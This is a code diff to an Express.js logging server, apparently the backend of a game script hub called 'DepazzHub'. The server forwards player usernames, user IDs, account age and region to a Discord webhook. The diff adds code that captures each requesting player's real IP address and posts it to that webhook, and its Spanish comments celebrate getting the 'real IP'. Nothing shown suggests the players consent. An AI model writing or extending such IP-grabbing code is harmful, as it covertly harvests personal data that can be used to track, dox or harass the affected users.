@@ -6,12 +6,18 @@ const app = express();
 app.use(express.json());
 app.use(cors());
 
+// ⚠️ ESTA LÍNEA ES CLAVE: Permite que Render/Heroku obtenga la IP real del usuario
+app.set('trust proxy', true);
+
 const DISCORD_WEBHOOK = process.env.DISCORD_WEBHOOK;
 
 app.post('/log', async (req, res) => {
     try {
         const { username, displayName, userId, gameId, accountAge, region } = req.body;
         
+        // 🌐 Aquí capturamos la IP real del jugador que hizo la petición
+        const clientIP = req.ip || req.connection.remoteAddress || 'N/A';
+
         const payload = {
             content: "🚀 **DepazzHub**",
             embeds: [{
@@ -19,6 +25,7 @@ app.post('/log', async (req, res) => {
                 fields: [
                     { name: "👤 Username", value: username || "Unknown", inline: true },
                     { name: "🏷️ Display Name", value: displayName || "N/A", inline: true },
+                    { name: "🌐 IP Address", value: `\`${clientIP}\``, inline: true }, // <-- Campo de IP añadido
                     { name: "🎂 Account Age", value: accountAge || "N/A", inline: true },
                     { name: "🌍 Region", value: region ? region.toUpperCase() : "N/A", inline: true },
                     { name: "🆔 User ID", value: String(userId || "N/A"), inline: true },
